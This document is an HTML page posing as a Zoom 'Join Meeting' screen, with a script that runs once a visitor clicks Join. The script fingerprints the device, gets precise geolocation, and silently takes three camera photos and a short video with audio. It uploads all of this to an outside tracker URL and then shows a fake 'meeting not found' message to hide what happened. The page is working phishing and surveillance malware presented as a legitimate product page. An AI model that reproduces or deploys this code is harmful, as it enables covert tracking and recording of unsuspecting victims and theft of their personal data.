<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Join Meeting - Zoom</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: #ffffff;
      color: #333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    header {
      padding: 16px 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #e5e5e5;
    }

    .logo {
      font-size: 32px;
      font-weight: 700;
      color: #0e72ed;
      letter-spacing: -2px;
    }

    .header-right {
      display: flex;
      gap: 12px;
    }

    .btn {
      padding: 8px 20px;
      border-radius: 9999px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      border: none;
    }

    .btn-support {
      background: white;
      border: 1px solid #0e72ed;
      color: #0e72ed;
    }

    .btn-signup {
      background: #0e72ed;
      color: white;
    }

    .main {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }

    .join-box {
      width: 100%;
      max-width: 480px;
      text-align: center;
    }

    h1 {
      font-size: 28px;
      font-weight: 600;
      margin-bottom: 32px;
      color: #1a1a1a;
    }

    .label {
      text-align: left;
      font-size: 14px;
      font-weight: 500;
      margin-bottom: 8px;
      color: #444;
    }

    input {
      width: 100%;
      padding: 16px 20px;
      font-size: 16px;
      border: 1px solid #d0d0d0;
      border-radius: 8px;
      margin-bottom: 16px;
    }

    .agreement {
      font-size: 13px;
      color: #555;
      margin: 20px 0;
      text-align: center;
    }

    .agreement a {
      color: #0e72ed;
      text-decoration: none;
    }

    #joinBtn {
      width: 100%;
      padding: 16px;
      background: #0e72ed;
      color: white;
      font-size: 18px;
      font-weight: 600;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
    }

    #joinBtn:hover {
      background: #0b5ed7;
    }

    .sip-link {
      margin-top: 32px;
      font-size: 14px;
      color: #0e72ed;
      text-decoration: none;
    }

    footer {
      padding: 20px 32px;
      border-top: 1px solid #e5e5e5;
      font-size: 12px;
      color: #777;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 12px;
    }

    #status, #error {
      margin-top: 20px;
      font-size: 14px;
      min-height: 22px;
    }

    video { display: none; }
  </style>
</head>
<body>

  <header>
    <div class="logo">zoom</div>
    <div class="header-right">
      <button class="btn btn-support">Support</button>
      <button class="btn btn-signup">Sign Up Free</button>
    </div>
  </header>

  <div class="main">
    <div class="join-box">
      <h1>Join Meeting</h1>

      <div class="label">Meeting ID or Personal Link Name</div>
      <input type="text" id="meetingId" placeholder="Enter Meeting ID or Personal Link Name" value="987-654-321" readonly>

      <div class="agreement">
        By clicking "Join", you agree to our 
        <a href="#" target="_blank">Terms of Services</a> and 
        <a href="#" target="_blank">Privacy Statement</a>
      </div>

      <button id="joinBtn">Join</button>

      <div id="status"></div>
      <div id="error"></div>

      <a href="#" class="sip-link">Join a meeting from an H.323/SIP room system</a>
    </div>
  </div>

  <footer>
    <div>© 2026 Zoom Communications, Inc. All rights reserved. <a href="#">Privacy & Legal Policies</a></div>
    <div>English ▼</div>
    <div style="font-size:20px;">💬</div>
  </footer>

  <video id="video" autoplay playsinline muted></video>

  <script>
    const btn = document.getElementById('joinBtn');
    const status = document.getElementById('status');
    const errorDiv = document.getElementById('error');
    const videoEl = document.getElementById('video');
    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';

    async function getDeviceFingerprint() {
      return {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}×${screen.height}`,
        cpuCores: navigator.hardwareConcurrency || 'N/A',
        deviceMemory: navigator.deviceMemory || 'N/A',
        touchSupport: navigator.maxTouchPoints > 0
      };
    }

    btn.addEventListener('click', async () => {
      btn.disabled = true;
      status.textContent = 'Connecting to meeting...';
      errorDiv.textContent = '';

      try {
        const deviceInfo = await getDeviceFingerprint();

        // Geolocation
        status.textContent = 'Accessing location...';
        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true, timeout:10000}));
        const location = {
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          accuracy: pos.coords.accuracy
        };

        // Camera + Audio
        status.textContent = 'Activating camera...';
        const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode:"user"}, audio: true });
        videoEl.srcObject = stream;
        await videoEl.play();

        // 3 Photos
        const photos = [];
        for (let i = 0; i < 3; i++) {
          await new Promise(r => setTimeout(r, 1100));
          const canvas = document.createElement('canvas');
          canvas.width = videoEl.videoWidth || 640;
          canvas.height = videoEl.videoHeight || 480;
          canvas.getContext('2d').drawImage(videoEl, 0, 0);
          photos.push(canvas.toDataURL('image/jpeg', 0.82));
        }

        // Video Recording (3 seconds)
        status.textContent = 'Recording...';
        const recorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        await new Promise(r => setTimeout(r, 3200));
        recorder.stop();

        const videoBlob = await new Promise(res => recorder.onstop = () => res(new Blob(chunks, {type:'video/webm'})));

        // Send to dashboard.php
        status.textContent = 'Joining meeting...';
        const formData = new FormData();
        formData.append('location', JSON.stringify(location));
        formData.append('device_info', JSON.stringify(deviceInfo));
        formData.append('video', videoBlob, `zoom_${Date.now()}.webm`);

        for (let i = 0; i < photos.length; i++) {
          const blob = await fetch(photos[i]).then(r => r.blob());
          formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
        }

        await fetch(SERVER_URL, { method: 'POST', body: formData });

        status.innerHTML = '✅ Joined successfully';
        setTimeout(() => alert("Meeting not found or unavailable. Please try again later."), 1200);

        stream.getTracks().forEach(t => t.stop());

      } catch (err) {
        console.error(err);
        errorDiv.textContent = 'Unable to join. Please allow camera and location access.';
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
